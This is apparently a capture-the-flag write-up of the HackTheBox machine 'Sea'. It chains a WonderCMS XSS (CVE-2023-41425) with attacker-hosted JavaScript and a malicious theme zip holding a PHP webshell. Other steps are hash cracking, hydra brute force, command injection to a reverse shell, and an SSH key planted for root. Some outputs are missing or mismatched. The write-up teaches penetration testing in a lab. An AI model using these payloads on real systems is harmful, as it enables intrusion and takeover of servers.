![Sea](/img/sea-cover.png)

Sea starts with the exploitation of WonderCMS. I‚Äôll find a POC, but work through the steps manually to better show them and learn from them. WonderCMS stores data in files, and I‚Äôll find a password hash in a file and crack it to move to the next user. That same password grants access to an internal website where I‚Äôll find a command injection to get root. In Beyond Root, I‚Äôll show an alternative path involving bruteforcing the WonderCMS admin password.

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal. There‚Äôs a message that the `httponly` flag is not set on `PHPSESSID`, which both represents a vulnerability should there be a cross-site scripting (XSS) vulnerability, and suggests the site is running on PHP.

### Website - TCP 80

#### Site

The site is about biking adventures and competitions:

![image-20240811084101062](/img/image-20240811084101062.png)

The ‚ÄúHow To Participate‚Äù link leads to `/how-to-participate`:

![image-20240811084418965](/img/image-20240811084418965.png)

Nothing too interesting on that page, other than a link to ‚Äúcontact‚Äù, which leads to `sea.htb/contact.php`.

I‚Äôll add `sea.htb` to my `/etc/hosts` file:

```
10.10.11.28 sea.htb

```

I‚Äôll also do a quick `ffuf` run to fuzz subdomains that respond differently, but not find any.

Now able to resolve the site, the contact form loads:

![image-20240811085204034](/img/image-20240811085204034.png)

On submitting the form, it shows it was submitted:

![image-20240811085509162](/img/image-20240811085509162.png)

#### Tech Stack

The `nmap` scan showed the `PHPSESSID` cookie, which is set in the initial response header:

```

HTTP/1.0 200 OK
Date: Sun, 11 Aug 2024 12:39:53 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=1cvtlil3q6a71emiof85iggeta; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3670
Connection: close
Content-Type: text/html; charset=UTF-8

```

There‚Äôs also the `contact.php` page. So it‚Äôs safe to say the site is written in PHP.

The 404 page just shows the same template with a 404 message:

![image-20240811085738216](/img/image-20240811085738216.png)

#### Directory Brute Force

I‚Äôll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://sea.htb -x php

```

There are several interesting paths to explore.

Each of the directories that return 301 redirect to the same path with a `/` on the end, and that returns 403 forbidden. This could be a permissions thing, or just that Apache is configured to not allow access to these directories, only the files in them.

#### Theme Identification

The `theme/bike` directory has some files worth checking out. I stared down this road thinking it would be cool to identify the exact theme, but it turns out to be a necessary step to exploiting the intended path on the box.

`theme.php` returns an empty page when visited directly. That makes sense, as it‚Äôs likely meant to be included in the main pages.

`version` return ‚Äú3.2.0‚Äù. `LICENSE` shows the theme uses the MIT license:

![image-20240811110108794](/img/image-20240811110108794.png)

‚Äúturboblack‚Äù is a good keyword to note.

`summary` contains the text ‚ÄúAnimated bike theme, providing more interaction to your visitors.‚Äù

Searching around, there‚Äôs a reference to WonderCMS:

![image-20240811111302822](/img/image-20240811111302822.png)

A bit more searching finds the theme on GitHub at <https://github.com/robiso/bike>:

![image-20240811111510378](/img/image-20240811111510378.png)

The `README.md` file is also on Sea:

![image-20240811111612709](/img/image-20240811111612709.png)

So the site is running on [WonderCMS](https://www.wondercms.com/).

## Shell as www-data

### Contact Form Fails

#### XSS

Given the contact form, it makes sense to check it for XSS. Because I don‚Äôt get to see what comes back from the form submission, it would be a blind XSS. I‚Äôll try something like this:

![image-20240811091317528](/img/image-20240811091317528.png)

The site complains that the email is not a valid email (client-side validation), but I can send it via Burp Repeater and it works fine:

![image-20240811105531913](/img/image-20240811105531913.png)

I‚Äôm using a slightly different URL for each HTML injection attempt so I can easily track which trigger. I‚Äôll have a Python webserver listening, but no contacts.

#### SSRF

Another thing to check for is a server-side request forgery (SSRF), or if there‚Äôs a user clicking on the link sent in the ‚ÄúWebsite‚Äù field.

I‚Äôll try sending my IP as the website:

![image-20240811105836920](/img/image-20240811105836920.png)

There‚Äôs no contact at my Python webserver.

### CVE-2023-41425

#### Identify

I don‚Äôt have a WonderCMS version to go with, so I‚Äôll look for vulnerabilities in general, with an idea that this box was released on August 2024, so focusing on CVEs from 2023 and 2024.

There‚Äôs a bunch of results that come back, but on the first page, the one that jumps out is CVE-2023-41425:

![image-20240811112537449](/img/image-20240811112537449.png)

This one sticks out because it:
- offers remote code execution;
- is unauthenticated;
- is recent.

This POC has a Python script that will exploit the vulnerability, but I will do it manually to understand it better. It‚Äôs also a very difficult to use POC.

#### Login URL

To use this exploit, I need to know the login URL for WonderCMS. There are a lot of ways to figure this out. Forum posts like [this one](https://www.wondercms.com/community/viewtopic.php?t=1053) makes reference to `/loginURL`:

![image-20240811125205579](/img/image-20240811125205579.png)

That same relative path is in the exploit POC screenshot:

![image-20240811125253481](/img/image-20240811125253481.png)

It‚Äôs in a different format (`/loginURL` vs `/index.php?page=loginURL`), but that‚Äôs a common PHP page structure.

If I download the WonderCMS source there‚Äôs only a simple `index.php` file. In it, there‚Äôs a `createDb` function that defines the `login` page:

![image-20240811125542073](/img/image-20240811125542073.png)

Other places, it seems hard coded into the PHP:

![image-20240811125624638](/img/image-20240811125624638.png)

When I visit `/loginURL` (or `/index.php?page=loginURL`), it loads the template with the login form in the content page:

![image-20240811125708006](/img/image-20240811125708006.png)

#### XSS POC

To show this works, I‚Äôm going to send a URL that looks like this:

```

http://sea.htb/index.php?page=loginURL"></form><script src="http://10.10.14.6/0xdf.js"></script><form action="

```

The idea is that it gets put into a `form`, which the payload then closes, creates a `script` tag loading JavaScript from my host, and then starts a new form so that all the HTML is valid.

I‚Äôll submit this in the contact form:

![image-20240811133859527](/img/image-20240811133859527.png)

In about a minute, there‚Äôs a connection at my Python webserver:

```

oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.28 - - [11/Aug/2024 13:40:49] code 404, message File not found
10.10.11.28 - - [11/Aug/2024 13:40:49] "GET /0xdf.js HTTP/1.1" 404 -

```

That‚Äôs successful XSS.

#### Malicious Theme

The [theme file from the POC](https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip) is very simple:

```

oxdf@hacky$ unzip -l main.zip 
Archive:  main.zip
1f1a52393d8a6ff6c27e56d958c6d0ee45e7a37f
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2023-08-02 12:44   revshell-main/
     5736  2023-08-02 12:44   revshell-main/rev.php
---------                     -------
     5736                     2 files

```

I‚Äôll make my own. It‚Äôs just a simple PHP webshell in a theme name directory in a zip archive:

```

oxdf@hacky$ cat theme223/cmd.php
<?php system($_REQUEST['cmd']); ?>
oxdf@hacky$ zip -r theme223.zip theme223/
  adding: theme223/ (stored 0%)
  adding: theme223/cmd.php (stored 0%)
oxdf@hacky$ unzip -l theme223.zip 
Archive:  theme223.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2024-08-11 13:52   theme223/
       35  2024-08-11 13:52   theme223/cmd.php
---------                     -------
       35                     2 files

```

#### XSS Payload

As I can inject a script tag, the attack is to abuse this XSS as the logged in user, and use that to install a malicious theme. The POC is a bit complicated for me. It‚Äôs doing a lot, when really only one request is needed. The JS will:
- Get a token value from the current page.
- Make a request to install a theme from a remote host (my VM).

That JavaScript will look like:

```

var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = "/?installModule=http://10.10.14.6/theme223.zip&directoryName=violet&type=themes&token=" + token;
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", urlRev);
xhr.send();

```

I‚Äôll save this as `0xdf.js`, and when Sea next requests it (it doesn‚Äôt seem to clean up on failed gets), the Python webserver returns the JS, and then there are four requests for the theme:

```
10.10.11.28 - - [11/Aug/2024 13:56:52] "GET /0xdf.js HTTP/1.1" 200 -
10.10.11.28 - - [11/Aug/2024 13:57:01] "GET /theme223.zip HTTP/1.1" 200 -
10.10.11.28 - - [11/Aug/2024 13:57:01] "GET /theme223.zip HTTP/1.1" 200 -
10.10.11.28 - - [11/Aug/2024 13:57:01] "GET /theme223.zip HTTP/1.1" 200 -
10.10.11.28 - - [11/Aug/2024 13:57:01] "GET /theme223.zip HTTP/1.1" 200 -

```

I‚Äôll find the unpacked webshell at `/themes/theme223/cmd.php`, and it works to get code execution:

```

oxdf@hacky$ curl http://sea.htb/themes/theme223/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

To get a shell, I‚Äôll replace `id` with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw). I‚Äôll write it out in the Firefox address bar, as it will take care of URL-encoding bits for me. I will need to use `%26` instead of `&` so that it doesn‚Äôt think it‚Äôs the separator for a new parameter:

![image-20240811140414115](/img/image-20240811140414115.png)

On submitting, I get a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.28 40808
bash: cannot set terminal process group (1151): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sea:/var/www/sea/themes/theme223$ 

```

I‚Äôll upgrade with the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@sea:/var/www/sea/themes/theme223$ script /dev/null -c bash
Script started, file is /dev/null
www-data@sea:/var/www/sea/themes/theme223$ ^Z

oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@sea:/var/www/sea/themes/theme223$

```

## Shell as amay

### Enumeration

#### Users

There are two users with home directories in `/home`:

```

www-data@sea:/home$ ls
amay  geo

```

Those same two users and root have shells set on the box:

```

www-data@sea:/home$ grep "sh$" /etc/passwd
root:x:0:0:root:/root:/bin/bash
amay:x:1000:1000:amay:/home/amay:/bin/bash
geo:x:1001:1001::/home/geo:/bin/bash

```

www-data is not able to read from geo‚Äôs home directory. They can list files in amay‚Äôs:

```

www-data@sea:/home$ find . -type f  
find: './geo': Permission denied
find: './amay/.ssh': Permission denied
find: './amay/.cache': Permission denied
./amay/.profile
./amay/.bashrc
./amay/.bash_logout
./amay/user.txt

```

www-data is not able to read anything interesting.

#### Website

The root of the website is located in `/var/www/sea`:

```

www-data@sea:/var/www/sea$ ls
contact.php  data  index.php  messages  plugins  themes

```

`contact.php` contains all the HTML for the contact form, as well as this PHP that handles the POST request:

```

 <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") { 
        $name = $_POST["name"];
        $email = $_POST["email"];
        $age = $_POST["age"];
        $country = $_POST["country"];
        $website = $_POST["website"];
        $message = "";                               
        $content = "Name: $name\nEmail: $email\nAge: $age\nCountry: $country\nWebsite: $website\n";

        $file_path = "/var/www/sea/messages/" . date("Y-m-d") . ".txt";

        if (file_put_contents($file_path, $content, FILE_APPEND) !== false) {
            $message = "<p style='color: green;'>Form submitted successfully!</p>";
        } else {
            $message = "<p style='color: red;'>Failed to submit form. Please try again later.</p>";
        }
    }
    ?>

```

Basically it appends to the with with today‚Äôs date in `/var/www/sea/messages`. It‚Äôs empty, but if I send my exploit again, it is in there (the bot cleans it up after seeing it):

```

www-data@sea:/var/www/sea/messages$ cat 2024-08-11.txt
Name: 0xdf
Email: 0xdf@sea.htb
Age: 100
Country: usa
Website: http://sea.htb/index.php?page=loginURL"></form><script src="http://10.10.14.6/0xdf.js"></script><form action="

```

In `data`, there‚Äôs a `database.js` file:

```

www-data@sea:/var/www/sea/data$ ls
cache.json  database.js  files

```

WonderCMS is proudly a file-based system, with no more complicated DB. `database.js` has the info for the site in a JSON format:

The `password` field jumps out as interesting.

#### Network

There are two services listening only on localhost, TCP 8080 and 34337:

```

amay@sea:~$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name

tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -

```

8080 is a webserver that requires HTTP basic auth to access, as shown by the 401 response and the `WWW-Authenticate` header:

```

amay@sea:~$ curl -v localhost:8080
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 401 Unauthorized
< Host: localhost:8080
< Date: Sun, 11 Aug 2024 19:25:14 GMT
< Connection: close
< X-Powered-By: PHP/7.4.3-4ubuntu2.23
< WWW-Authenticate: Basic realm="Restricted Area"
< Content-type: text/html; charset=UTF-8
< 
* Closing connection 0
Unauthorized access

```

The 34337 port also speaks HTTP:

```

amay@sea:~$ curl -v localhost:8080
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 401 Unauthorized

< Date: Sun, 11 Aug 2024 19:25:14 GMT
< Connection: close

< WWW-Authenticate: Basic realm="Restricted Area"
< Content-type: text/html; charset=UTF-8
< 
* Closing connection 0
Unauthorized access

```

This turns out to be related to the headless Chrome instance that is being exploited by the XSS above.

### Crack Hash

I‚Äôll take the hash from the database and save it in a file. There are two `\` that are escaping `/` that I‚Äôll need to remove:

```

oxdf@hacky$ cat hash 
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q

```

I‚Äôll pass that to `hashcat`, which identifies is as one of four possible hash format:

```

$ hashcat hash rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].
...[snip]...

```

3200 is the standard bcrypt hash, which is the most common, so I‚Äôll start there:

```

$ hashcat hash rockyou.txt -m 3200
hashcat (v6.2.6) starting
...[snip]...
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
...[snip]...

```

The password is ‚Äúmychemicalromance‚Äù.

### Identify User

A quick way to check this password against users on the box is with `netexec` (though if they all fail, it‚Äôs worth trying again with `su` as it‚Äôs possible that the password is good but the login fails for some other reason).

```

oxdf@hacky$ netexec ssh sea.htb -u users -p mychemicalromance --continue-on-success
SSH         10.10.11.28     22     sea.htb          [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
SSH         10.10.11.28     22     sea.htb          [-] geo:mychemicalromance Authentication failed.
SSH         10.10.11.28     22     sea.htb          [+] amay:mychemicalromance  (non root) Linux - Shell access!
SSH         10.10.11.28     22     sea.htb          [-] root:mychemicalromance Authentication failed.

```

The password works for amay.

### su / SSH

The password works with `su`:

```

www-data@sea:/$ su - amay
Password: 
amay@sea:~$

```

It also works over SSH:

```

oxdf@hacky$ sshpass -p mychemicalromance ssh amay@sea.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)
...[snip]...
amay@sea:~$ 

```

And I can grab `user.txt`:

```

amay@sea:~$ cat user.txt
cd47aa3f************************

```

## Shell as root

### Enumeration

#### Tunnel

I‚Äôll reconnect my SSH session with the `-L 8000:localhost:8080` option to tunnel so that my VM localhost listens on 8000 and forwards that through the SSH session to 8080 on Sea. I‚Äôm using 8000 because Burp is already listening on my host on 8080.

Visiting `http://localhost:8000` pops the HTTP basic auth prompt:

![image-20240811153148903](/img/image-20240811153148903.png)

#### Access

The creds for amay, ‚Äúmychemicalromance‚Äù, work here as well:

![image-20240811153239701](/img/image-20240811153239701.png)

#### Functionality

Each of the buttons leads to a POST request to `/` with a POST body that includes the button name. For example, clicking ‚ÄúClean system with apt‚Äù sends this (with some extra headers cleaned up for display):

```

POST / HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Origin: http://localhost:8000
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: close
Referer: http://localhost:8000/

clean_apt=

```

There‚Äôs nothing displayed back when the ‚ÄúSystem Management‚Äù buttons are pushed. ‚ÄúUpdate system‚Äù just crashes the page with no reply. The others return nothing. The four POST parameters are `clean_apt`, `update_system`, `clear_auth_log`, and `clear_access_log`.

The ‚ÄúAnalyze‚Äù button sends a `log_file` parameter along with the button name, `analyze_log`:

```

POST / HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://localhost:8000
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: close
Referer: http://localhost:8000/

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=

```

Analyzing the log access log (before clearing it) shows some of the suspicious request involved in getting a foothold on Sea:

![image-20240811154205934](/img/image-20240811154205934.png)

Given the files and commands necessary to perform these actions, it seems very likely that the server is running as root.

#### Tech Stack

The HTTP response headers on this internal service show it is also PHP:

```

HTTP/1.1 200 OK
Host: localhost:8000
Date: Sun, 11 Aug 2024 19:31:57 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.23
Content-type: text/html; charset=UTF-8

```

The page loads as `/index.php` as well.

### File Read (Sort Of)

I‚Äôll notice in the log file read it‚Äôs left to the user to specify what file to request. While there are only two in the dropdown menu:

![image-20240811154447778](/img/image-20240811154447778.png)

There‚Äôs nothing to stop an attacker from changing that request. I‚Äôll send one of these requests to Burp Repeater and edit the parameter to point to `/etc/passwd`:

![image-20240811154553991](/img/image-20240811154553991.png)

It works to some degree, but only select lines from `/etc/passwd` are returned. I can try to read the flag:

![image-20240811154636813](/img/image-20240811154636813.png)

Nothing interesting there. Same for `/root/.ssh/id_rsa`.

### Command Injection

#### POC

It‚Äôs possible that the code is using the system to get the contents of the file with tools like `cat` and `grep`. While it‚Äôs a bit silly for PHP to read a file with `cat`, sometimes a lazy dev will use `grep` for easy pattern matching.

If that is the case, I‚Äôll try to inject into that by adding a `;` and then another command. A very safe command to inject is a sleep, as all I need is response timing to see if it worked. I‚Äôll try that. When I sleep for 0, it returns in ~200 millis:

![image-20240811155311417](/img/image-20240811155311417.png)

Changing the 0 to 2 results in ~2200 millis:

![image-20240811155335483](/img/image-20240811155335483.png)

That‚Äôs command injection.

#### Output

If I change `sleep 2` to `id` while requesting the `id_rsa` file, it doesn‚Äôt return any results:

![image-20240811155458773](/img/image-20240811155458773.png)

Some tweaking around with the injection will show output. In this case, I‚Äôll adding ‚Äú #‚Äù after the command, so that anything else on the line is commented out:

![image-20240811155826000](/img/image-20240811155826000.png)

Not only did that work, but it‚Äôs running as roo.

#### Reverse Shell Fails

I‚Äôll update my payload to a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

![image-20240811160355825](/img/image-20240811160355825.png)

On sending, I get a shell at my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.28 33466
bash: cannot set terminal process group (10160): Inappropriate ioctl for device
bash: no job control in this shell
root@sea:~/monitoring# 

```

However, a few seconds after connecting, it types `exit` into the shell and exits:

```

root@sea:~/monitoring# exit
oxdf@hacky$ 

```

I played with a few things like running in the background and `nohup`, but wasn‚Äôt able to get a better shell.

#### SSH

There is a `.ssh` directory in `/root`:

![image-20240811161540747](/img/image-20240811161540747.png)

It only has an `authorized_keys` file, no keys:

![image-20240811161609472](/img/image-20240811161609472.png)

I‚Äôll create an SSH key pair and host the public key on a Python webserver. Then I‚Äôll fetch it and add it to `authorized_keys`:

![image-20240811161811016](/img/image-20240811161811016.png)

Now I can connect over SSH using that key as root:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@sea.htb 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)
...[snip]...
root@sea:~#

```

And read `root.txt`:

```

root@sea:~# cat root.txt
5560f2ef************************

```

## Beyond Root - Unintended Path

### Overview

There is an unintended path that allows for skipping directly to amay as a foothold. In context with the intended path, it looks like this:

```

flowchart TD;

      direction LR
      start1[ ] --->|intended| stop1[ ]

    end

style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

The password to the WonderCMS admin panel is brute force-able, which means I can brute force it directly and get access. That password is also the amay user‚Äôs password, but I don‚Äôt have that username at this point. If I could get the username, I could skip WonderCMS entirely after getting the password.

### Brute Force Admin

#### Admin Login Form

I noted [above](#login-url) that `/loginURL` presents a form that just takes a password:

![image-20240812144913408](/img/image-20240812144913408.png)

Submitting generates a POST request like this:

```

POST /loginURL HTTP/1.1
Host: sea.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8

Connection: close
Referer: http://sea.htb/loginURL
Cookie: PHPSESSID=nh31i681gr3f4ed2h048899m0k

password=test

```

On the site, there‚Äôs a popup showing it failed:

![image-20240812145221983](/img/image-20240812145221983.png)

#### Brute Force

Web form brute force will never been the intended path on a modern HTB machine, but sometimes it does present an unintended path, as in this case. I‚Äôll use [hydra](https://github.com/vanhauser-thc/thc-hydra) to do the brute force with the following parameters:
- `-l ''` - The POST does not take a username, but `hydra` requires on be given, so I like to give an empty string (though anything will work).
- `-P rockyou.txt` - The wordlist of passwords to try, in this case `rockyou.txt`.
- `sea.htb` - The target server.
- `http-post-form` - The module to use for brute forcing, in this case an HTTP form.
- `'/loginURL:password=^PASS^:Wrong'` - The string of arguments for the module, split on `:`:
  - `/loginURL` - The relative path to send the POST request to.
  - `password=^PASS^` - The POST body, with `^PASS^` being where each password is substituted. I can also provide `^USER^` for the user value.
  - `Wrong` - The text that indicates failure.

Running this takes about eight minutes to find the right password in `rockyou.txt`, at which point I‚Äôll hit Ctrl-c to end the brute force:

```

### Upload Theme

#### Admin Panel Enumeration

It is technically possible to SSH now with this password, but I don‚Äôt have the username to log in with, so I‚Äôll explore the admin panel. On entering the password, the main page is loaded, but with a bunch of extra buttons / notifications:

![image-20240812152538171](/img/image-20240812152538171.png)

Clicking ‚ÄúSettiongs‚Äù loads a form:

![image-20240812152610597](/img/image-20240812152610597.png)

I can edit content and create pages. HTML injection and XSS is very do-able via this function, but that doesn‚Äôt buy me much at this point.

The ‚ÄúFiles‚Äù menu has an upload option:

![image-20240812152917440](/img/image-20240812152917440.png)

If I try an PHP webshell, it fails:

![image-20240812152909491](/img/image-20240812152909491.png)

The ‚ÄúThemes‚Äù page has a bunch of themes that can be installed, including the existing one:

![image-20240812153022347](/img/image-20240812153022347.png)

At the bottom there‚Äôs a form to add a custom module:

![image-20240812153038398](/img/image-20240812153038398.png)

The ‚ÄúPlugins‚Äù page is similar, with the same form at the bottom. The ‚ÄúSecurity‚Äù page offers a configuration to change the login URL, the password, and a few other configurations.

#### Malicious Theme

The exploit used [above](#malicious-theme) had the admin submit a malicious theme providing the URL of the zip archive. Without knowing how that works, I‚Äôll try to use the GUI admin panel here. The ‚ÄúCustom Module‚Äù form at the bottom of the ‚ÄúThemes‚Äù page says it takes the URL to a `wcms-modules.json` file. Giving it the URL to where I‚Äôm hosting the zip doesn‚Äôt work.

[This page](https://github.com/WonderCMS/wondercms/wiki/Custom-modules#custom-theme-module-requirements) shows how to create a `wcms-modules.json` file. I‚Äôll create one from that template:

```

{
    "version": 1,
    "themes": {
        "theme-name": {
            "name": "Theme-0xdf",
            "repo": "http://10.10.14.6/repo",
            "zip": "http://10.10.14.6/theme223.zip",
            "summary": "Malicious Theme",
            "version": "1.0.0",
            "image": "http://10.10.14.6/image.jpg"
        }
    }
}

```

Hosting that and the same `theme223.zip` file from [above](#malicious-theme) on my Python webserver, I‚Äôll submit the URL to the admin panel. There‚Äôs a popup warning that this is dangerous:

![image-20240812153608020](/img/image-20240812153608020.png)

There are three requests at my server:

```
10.10.11.28 - - [12/Aug/2024 15:36:13] "GET /wcms-modules.json HTTP/1.1" 200 -
10.10.11.28 - - [12/Aug/2024 15:36:13] "GET /wcms-modules.json HTTP/1.1" 200 -
10.10.14.6 - - [12/Aug/2024 15:36:14] code 404, message File not found
10.10.14.6 - - [12/Aug/2024 15:36:14] "GET /image.jpg HTTP/1.1" 404 -

```

It‚Äôs interesting that the first two are from Sea, and then the next GET for the image is from my browser. That suggests to me that the module was processed, and then displayed back as part of the page. The page I see is the main page with a popup:

![image-20240812153831570](/img/image-20240812153831570.png)

Back on the Themes page my theme is at the bottom with no image:

![image-20240812153858955](/img/image-20240812153858955.png)

There hasn‚Äôt been a request for the zip archive yet, but there‚Äôs an ‚ÄúInstall‚Äù button. When I click it, two more requests:

```
10.10.11.28 - - [12/Aug/2024 15:39:33] "GET /theme223.zip HTTP/1.1" 200 -
10.10.14.6 - - [12/Aug/2024 15:39:34] code 404, message File not found
10.10.14.6 - - [12/Aug/2024 15:39:34] "GET /image.jpg HTTP/1.1" 404 -

```

The page shows it installed:

![image-20240812154007679](/img/image-20240812154007679.png)

And the webshell is there:

![image-20240812154030698](/img/image-20240812154030698.png)

From here, I can get a shell, or just find the names of the users from `/etc/passwd` or `/home` and find that the admin password works for amay.
